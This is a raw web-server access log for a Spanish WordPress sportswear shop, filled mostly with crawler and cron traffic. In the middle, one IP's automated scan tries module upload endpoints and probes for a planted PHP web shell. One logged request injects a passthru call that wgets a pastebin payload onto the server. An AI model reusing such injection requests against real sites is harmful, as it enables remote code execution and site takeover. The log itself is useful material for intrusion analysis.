40.77.167.84 - - [11/Dec/2019:06:59:08 +0100] "GET /producto/bandana-microfibra-tipo-buff/ HTTP/1.1" 200 92276 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
66.249.64.146 - - [11/Dec/2019:06:59:47 +0100] "GET /categoria-producto/inicio/ropa-amazing-sport-wear/ciclismo-ropa-amazing-sport-wear/page/2/ HTTP/1.1" 404 72654 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
40.77.167.84 - - [11/Dec/2019:07:04:10 +0100] "GET /wp-content/plugins/woocommerce/assets/js/zoom/jquery.zoom.min.js?ver=1.7.21 HTTP/1.1" 200 6320 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:07:04:10 +0100] "GET /wp-content/themes/shopper/assets/fonts/fontawesome-webfont.svg?v=4.7.0 HTTP/1.1" 200 445505 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:07:04:11 +0100] "GET /wp-content/themes/shopper/assets/fonts/fontawesome-webfont.ttf?v=4.7.0 HTTP/1.1" 200 166178 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:07:04:12 +0100] "GET /wp-content/themes/shopper/assets/js/crm.js?ver=1561548510 HTTP/1.1" 200 874 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:07:04:12 +0100] "GET /wp-content/themes/shopper/assets/js/woocommerce/header-cart.min.js?ver=1.3.8 HTTP/1.1" 200 972 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:07:04:12 +0100] "GET /wp-content/themes/shopper/assets/sass/woocommerce/woocommerce.css?ver=5.2.4 HTTP/1.1" 200 83534 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:07:04:12 +0100] "GET /wp-includes/js/jquery/jquery.js HTTP/1.1" 200 97362 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:07:04:13 +0100] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1 HTTP/1.1" 200 10399 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:07:04:13 +0100] "GET /wp-includes/js/wp-util.min.js?ver=5.2.4 HTTP/1.1" 200 1387 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:07:04:13 +0100] "GET /wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4 HTTP/1.1" 200 3489 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.188 - - [11/Dec/2019:07:05:44 +0100] "GET /wp-content/plugins/product-enquiry-for-woocommerce/js/wdm_jquery.validate.min.js?ver=5.2.4 HTTP/1.1" 200 25181 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
217.76.130.90 - - [11/Dec/2019:07:05:46 +0100] "POST /wp-cron.php?doing_wp_cron=1576044346.0205619335174560546875 HTTP/1.1" 200 164 "http://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576044346.0205619335174560546875" "WordPress/5.2.4; https://amazingsportwear.com" "-"
157.55.39.188 - - [11/Dec/2019:07:05:45 +0100] "GET /atletismo/25-manguito-brazos-atletismo.html HTTP/1.1" 404 68097 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
157.55.39.188 - - [11/Dec/2019:07:05:48 +0100] "GET /wp-content/plugins/woocommerce/assets/js/frontend/single-product.min.js?ver=3.6.4 HTTP/1.1" 200 10056 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.188 - - [11/Dec/2019:07:05:48 +0100] "GET /wp-includes/js/jquery/ui/dialog.min.js?ver=1.11.4 HTTP/1.1" 200 12482 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.188 - - [11/Dec/2019:07:05:49 +0100] "GET /wp-includes/js/jquery/ui/resizable.min.js?ver=1.11.4 HTTP/1.1" 200 18798 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.188 - - [11/Dec/2019:07:06:58 +0100] "GET /wp-includes/js/jquery/ui/widget.min.js?ver=1.11.4 HTTP/1.1" 200 10613 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
66.249.64.144 - - [11/Dec/2019:07:12:10 +0100] "GET /wp-content/uploads/2019/04/bidon-match-4-300x300.png HTTP/1.1" 304 3566 "-" "Googlebot-Image/1.0" "-"
207.46.13.68 - - [11/Dec/2019:07:14:01 +0100] "GET /wp-content/plugins/woocommerce/assets/css/blocks/style.css?ver=3.6.4 HTTP/1.1" 200 10060 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
207.46.13.68 - - [11/Dec/2019:07:14:02 +0100] "GET /wp-content/plugins/woocommerce/assets/js/js-cookie/js.cookie.min.js?ver=2.1.4 HTTP/1.1" 200 2187 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
207.46.13.68 - - [11/Dec/2019:07:14:02 +0100] "GET /wp-content/plugins/woocommerce/assets/js/photoswipe/photoswipe.min.js?ver=4.1.1 HTTP/1.1" 200 32276 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
207.46.13.68 - - [11/Dec/2019:07:14:03 +0100] "GET /wp-content/plugins/wpfront-notification-bar/js/wpfront-notification-bar.js?ver=1.7.1 HTTP/1.1" 200 5662 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
207.46.13.68 - - [11/Dec/2019:07:14:03 +0100] "GET /wp-includes/js/jquery/ui/core.min.js?ver=1.11.4 HTTP/1.1" 200 4341 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.90 - - [11/Dec/2019:07:15:21 +0100] "GET /wp-content/plugins/cookie-law-info/public/js/cookie-law-info-public.js?ver=1.7.6 HTTP/1.1" 200 20439 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.90 - - [11/Dec/2019:07:15:28 +0100] "GET /wp-content/plugins/product-enquiry-for-woocommerce/js/contact.js?ver=5.2.4 HTTP/1.1" 200 8044 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.90 - - [11/Dec/2019:07:15:29 +0100] "GET /wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart-variation.min.js?ver=3.6.4 HTTP/1.1" 200 13625 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.90 - - [11/Dec/2019:07:15:30 +0100] "GET /wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart.min.js?ver=3.6.4 HTTP/1.1" 200 2983 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.90 - - [11/Dec/2019:07:15:31 +0100] "GET /wp-content/plugins/woocommerce/assets/js/photoswipe/photoswipe-ui-default.min.js?ver=4.1.1 HTTP/1.1" 200 10220 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.90 - - [11/Dec/2019:07:15:31 +0100] "GET /wp-content/themes/shopper/assets/js/shopper.min.js?ver=1.3.8 HTTP/1.1" 200 5994 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
217.76.130.90 - - [11/Dec/2019:07:19:55 +0100] "POST /wp-cron.php?doing_wp_cron=1576045195.4156680107116699218750 HTTP/1.1" 200 164 "http://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576045195.4156680107116699218750" "WordPress/5.2.4; https://amazingsportwear.com" "-"
87.98.165.248 - - [11/Dec/2019:07:19:52 +0100] "GET /wp-cleaner.php HTTP/1.1" 404 67956 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36" "-"
157.55.39.90 - - [11/Dec/2019:07:20:13 +0100] "GET /wp-includes/js/comment-reply.min.js?ver=5.2.4 HTTP/1.1" 200 5938 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.90 - - [11/Dec/2019:07:20:14 +0100] "GET /wp-includes/js/jquery/ui/button.min.js?ver=1.11.4 HTTP/1.1" 200 7578 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.90 - - [11/Dec/2019:07:20:15 +0100] "GET /wp-includes/js/wp-emoji-release.min.js?ver=5.2.4 HTTP/1.1" 200 14183 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
157.55.39.188 - - [11/Dec/2019:07:30:12 +0100] "GET /wp-content/uploads/2017/04/nath-sunset-mujer.jpg HTTP/1.1" 200 20155 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.76.130.90 - - [11/Dec/2019:07:33:45 +0100] "POST /wp-cron.php?doing_wp_cron=1576046025.1057069301605224609375 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576046025.1057069301605224609375" "WordPress/5.2.4; https://amazingsportwear.com" "-"
157.55.39.90 - - [11/Dec/2019:07:33:43 +0100] "GET /categoria-producto/nueve/ HTTP/1.1" 200 57661 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:07:34:29 +0100] "GET /wp-content/uploads/2019/04/Gorra-sport-1.png HTTP/1.1" 200 93681 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.76.130.90 - - [11/Dec/2019:07:40:35 +0100] "POST /wp-cron.php?doing_wp_cron=1576046435.0610361099243164062500 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576046435.0610361099243164062500" "WordPress/5.2.4; https://amazingsportwear.com" "-"
207.46.13.177 - - [11/Dec/2019:07:40:34 +0100] "GET /producto/brazalete-con-luz-pf-11811001/ HTTP/1.1" 200 94240 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.76.130.90 - - [11/Dec/2019:07:44:41 +0100] "POST /wp-cron.php?doing_wp_cron=1576046681.7240738868713378906250 HTTP/1.1" 200 164 "http://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576046681.7240738868713378906250" "WordPress/5.2.4; https://amazingsportwear.com" "-"
89.238.154.117 - - [11/Dec/2019:07:44:41 +0100] "POST //modules/columnadverts/uploadimage.php HTTP/1.1" 404 68039 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:44:42 +0100] "GET //modules/columnadverts/slides/HolaPresME_32670.php HTTP/1.1" 301 490 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:44:42 +0100] "GET /modules/columnadverts/slides/HolaPresME_32670.php HTTP/1.1" 404 68070 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:44:43 +0100] "POST //modules/vtemslideshow/uploadimage.php HTTP/1.1" 404 68073 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:44:44 +0100] "GET //modules/vtemslideshow/slides/HolaPresME_32670.php HTTP/1.1" 301 490 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:44:45 +0100] "GET /modules/vtemslideshow/slides/HolaPresME_32670.php HTTP/1.1" 404 68075 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:44:46 +0100] "POST //modules/simpleslideshow/uploadimage.php HTTP/1.1" 404 68052 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:44:47 +0100] "GET //modules/simpleslideshow/slides/HolaPresME_32670.php HTTP/1.1" 301 492 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:44:48 +0100] "GET /modules/simpleslideshow/slides/HolaPresME_32670.php HTTP/1.1" 404 68094 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:44:49 +0100] "POST //modules/vtemskitter/uploadimage.php HTTP/1.1" 404 68064 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:44:50 +0100] "GET //modules/vtemskitter/img/HolaPresME_32670.php HTTP/1.1" 301 485 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:44:51 +0100] "GET /modules/vtemskitter/img/HolaPresME_32670.php HTTP/1.1" 404 68125 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:44:52 +0100] "POST //modules/fieldvmegamenu/ajax/upload.php HTTP/1.1" 404 68071 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:44:53 +0100] "GET //modules/fieldvmegamenu/uploads/HolaPresME_32670.php HTTP/1.1" 301 492 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:44:54 +0100] "GET /modules/fieldvmegamenu/uploads/HolaPresME_32670.php HTTP/1.1" 404 68124 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:44:55 +0100] "POST //modules/pk_flexmenu/ajax/upload.php HTTP/1.1" 404 68060 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:44:56 +0100] "GET //modules/pk_flexmenu/uploads/HolaPresME_32670.php HTTP/1.1" 301 489 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:44:57 +0100] "GET /modules/pk_flexmenu/uploads/HolaPresME_32670.php HTTP/1.1" 404 68083 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:44:58 +0100] "POST //modules/pk_vertflexmenu/ajax/upload.php HTTP/1.1" 404 68098 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:44:59 +0100] "GET //modules/pk_vertflexmenu/uploads/HolaPresME_32670.php HTTP/1.1" 301 493 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:45:00 +0100] "GET /modules/pk_vertflexmenu/uploads/HolaPresME_32670.php HTTP/1.1" 404 68121 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:45:01 +0100] "POST //modules/wg24themeadministration/wg24_ajax.php HTTP/1.1" 404 68084 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:45:02 +0100] "GET //modules/wg24themeadministration/img/upload/HolaPresME_32670.php HTTP/1.1" 301 504 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
217.76.130.90 - - [11/Dec/2019:07:45:03 +0100] "POST /wp-cron.php?doing_wp_cron=1576046703.3696479797363281250000 HTTP/1.1" 200 164 "http://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576046703.3696479797363281250000" "WordPress/5.2.4; https://amazingsportwear.com" "-"
89.238.154.117 - - [11/Dec/2019:07:45:02 +0100] "GET /modules/wg24themeadministration/img/upload/HolaPresME_32670.php HTTP/1.1" 404 68124 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:45:03 +0100] "GET //modules/bamegamenu/ajax_phpcode.php?code=passthru(%22wget%20https://pastebin.com/raw/d1xFC0AK%20-O%20HolaPresME_32670.php%22); HTTP/1.1" 301 567 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:45:04 +0100] "GET /modules/bamegamenu/ajax_phpcode.php?code=passthru(%22wget%20https://pastebin.com/raw/d1xFC0AK%20-O%20HolaPresME_32670.php%22); HTTP/1.1" 404 68262 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:45:05 +0100] "GET //modules/bamegamenu/HolaPresME_32670.php HTTP/1.1" 301 480 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
89.238.154.117 - - [11/Dec/2019:07:45:06 +0100] "GET /modules/bamegamenu/HolaPresME_32670.php HTTP/1.1" 404 68094 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0" "-"
217.76.130.90 - - [11/Dec/2019:07:47:34 +0100] "POST /wp-cron.php?doing_wp_cron=1576046854.5895900726318359375000 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576046854.5895900726318359375000" "WordPress/5.2.4; https://amazingsportwear.com" "-"
40.77.167.84 - - [11/Dec/2019:07:47:33 +0100] "GET /categoria-producto/hombre/sudaderas/ HTTP/1.1" 200 60620 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
207.46.13.177 - - [11/Dec/2019:07:48:36 +0100] "GET /wp-content/uploads/2019/04/Gorra-sport-5.png HTTP/1.1" 200 52770 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" "-"
217.76.130.90 - - [11/Dec/2019:07:54:59 +0100] "POST /wp-cron.php?doing_wp_cron=1576047299.6909749507904052734375 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576047299.6909749507904052734375" "WordPress/5.2.4; https://amazingsportwear.com" "-"
31.13.103.3 - - [11/Dec/2019:07:54:59 +0100] "GET / HTTP/1.1" 200 125540 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
31.13.103.18 - - [11/Dec/2019:07:55:00 +0100] "GET / HTTP/1.1" 200 125500 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
31.13.103.19 - - [11/Dec/2019:07:55:01 +0100] "GET /contacta-con-nosotros HTTP/1.1" 301 319 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
31.13.103.23 - - [11/Dec/2019:07:55:01 +0100] "GET / HTTP/1.1" 200 125555 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
31.13.103.16 - - [11/Dec/2019:07:55:02 +0100] "GET /contacta-con-nosotros HTTP/1.1" 301 319 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
31.13.103.19 - - [11/Dec/2019:07:55:02 +0100] "GET /contacta-con-nosotros/ HTTP/1.1" 200 58172 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
217.76.130.90 - - [11/Dec/2019:07:55:03 +0100] "POST /wp-cron.php?doing_wp_cron=1576047303.3800940513610839843750 HTTP/1.1" 200 164 "http://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576047303.3800940513610839843750" "WordPress/5.2.4; https://amazingsportwear.com" "-"
31.13.103.16 - - [11/Dec/2019:07:55:02 +0100] "GET /contacta-con-nosotros/ HTTP/1.1" 200 58197 "-" "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)" "-"
217.76.130.90 - - [11/Dec/2019:07:56:49 +0100] "POST /wp-cron.php?doing_wp_cron=1576047409.7277960777282714843750 HTTP/1.1" 200 164 "http://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576047409.7277960777282714843750" "WordPress/5.2.4; https://amazingsportwear.com" "-"
43.229.88.210 - - [11/Dec/2019:07:56:49 +0100] "GET / HTTP/1.1" 301 336 "http://progressive-seo.com" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" "-"
217.76.130.90 - - [11/Dec/2019:08:06:48 +0100] "POST /wp-cron.php?doing_wp_cron=1576048008.3095870018005371093750 HTTP/1.1" 200 164 "http://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576048008.3095870018005371093750" "WordPress/5.2.4; https://amazingsportwear.com" "-"
40.77.167.31 - - [11/Dec/2019:08:06:47 +0100] "GET /robots.txt HTTP/1.1" 200 432 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:08:07:20 +0100] "GET /wp-content/plugins/woocommerce/assets/js/zoom/jquery.zoom.min.js?ver=1.7.21 HTTP/1.1" 200 6320 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:08:07:21 +0100] "GET /wp-content/themes/shopper/assets/fonts/fontawesome-webfont.svg?v=4.7.0 HTTP/1.1" 200 445505 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:08:07:22 +0100] "GET /wp-content/themes/shopper/assets/fonts/fontawesome-webfont.ttf?v=4.7.0 HTTP/1.1" 200 166178 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:08:07:22 +0100] "GET /wp-content/themes/shopper/assets/js/crm.js?ver=1561548510 HTTP/1.1" 200 874 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:08:07:22 +0100] "GET /wp-content/themes/shopper/assets/js/woocommerce/header-cart.min.js?ver=1.3.8 HTTP/1.1" 200 972 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:08:07:22 +0100] "GET /wp-content/themes/shopper/assets/sass/woocommerce/woocommerce.css?ver=5.2.4 HTTP/1.1" 200 83534 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:08:07:22 +0100] "GET /wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1 HTTP/1.1" 200 10399 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:08:07:23 +0100] "GET /wp-includes/js/jquery/jquery.js HTTP/1.1" 200 97362 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:08:07:23 +0100] "GET /wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4 HTTP/1.1" 200 3489 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
40.77.167.84 - - [11/Dec/2019:08:07:23 +0100] "GET /wp-includes/js/wp-util.min.js?ver=5.2.4 HTTP/1.1" 200 1387 "-" "msnbot/2.0b (+http://search.msn.com/msnbot.htm)" "-"
217.76.130.90 - - [11/Dec/2019:08:09:39 +0100] "POST /wp-cron.php?doing_wp_cron=1576048179.3909189701080322265625 HTTP/1.1" 200 164 "http://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576048179.3909189701080322265625" "WordPress/5.2.4; https://amazingsportwear.com" "-"
23.226.211.176 - - [11/Dec/2019:08:09:38 +0100] "GET / HTTP/1.1" 301 336 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:27.0) Gecko/20100101 Firefox/27.0" "-"
217.76.130.90 - - [11/Dec/2019:08:10:52 +0100] "POST /wp-cron.php?doing_wp_cron=1576048252.3308789730072021484375 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576048252.3308789730072021484375" "WordPress/5.2.4; https://amazingsportwear.com" "-"
66.249.64.146 - - [11/Dec/2019:08:10:51 +0100] "GET / HTTP/1.1" 200 125798 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
66.249.64.144 - - [11/Dec/2019:08:10:57 +0100] "POST /?wc-ajax=get_refreshed_fragments HTTP/1.1" 200 4708 "https://amazingsportwear.com/" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36" "wpfront-notification-bar-landingpage=1; _ga=GA1.2.2114912494.1576022400; _gid=GA1.2.931330593.1576022400; _gat_gtag_UA_91619287_1=1"
217.76.130.90 - - [11/Dec/2019:08:11:12 +0100] "POST /wp-cron.php?doing_wp_cron=1576048272.5627861022949218750000 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576048272.5627861022949218750000" "WordPress/5.2.4; https://amazingsportwear.com" "-"
66.249.64.146 - - [11/Dec/2019:08:11:12 +0100] "GET /ofertas/191-maillot-manga-larga-ciclismo.html HTTP/1.1" 404 72325 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" "-"
77.27.246.70 - - [11/Dec/2019:08:13:23 +0100] "GET /wp-content/uploads/2017/03/VA-CAVAMAURB-2.jpg HTTP/1.1" 200 12538 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
77.27.246.70 - - [11/Dec/2019:08:13:30 +0100] "GET /wp-content/uploads/2017/03/VA-CAVAMAUYB-3.jpg HTTP/1.1" 200 9201 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0" "-"
200.68.140.41 - - [11/Dec/2019:08:13:30 +0100] "GET /wp-content/uploads/2019/04/gorra-dowan-2.png HTTP/1.1" 200 88550 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36" "-"
217.76.130.90 - - [11/Dec/2019:08:14:08 +0100] "POST /wp-cron.php?doing_wp_cron=1576048448.4892060756683349609375 HTTP/1.1" 200 3389 "https://amazingsportwear.com/wp-cron.php?doing_wp_cron=1576048448.4892060756683349609375" "WordPress/5.2.4; https://amazingsportwear.com" "-"
112.113.220.111 - - [11/Dec/2019:08:14:07 +0100] "GET /categoria-producto/inicio/page/18?add-to-cart=18695 HTTP/1.1" 301 4816 "-" "Mozilla/5.0(Linux;Android 5.1.1;OPPO A33 Build/LMY47V;wv) AppleWebKit/537.36(KHTML,link Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 LieBaoFast/4.51.3" "-"
27.40.90.218 - - [11/Dec/2019:08:14:09 +0100] "GET /categoria-producto/carpas HTTP/1.1" 301 3549 "-" "Mozilla/5.0 (Linux; Android 7.0; FRD-AL00 Build/HUAWEIFRD-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043602 Safari/537.36 MicroMessenger/6.5.16.1120 NetType/WIFI Language/zh_CN" "-"
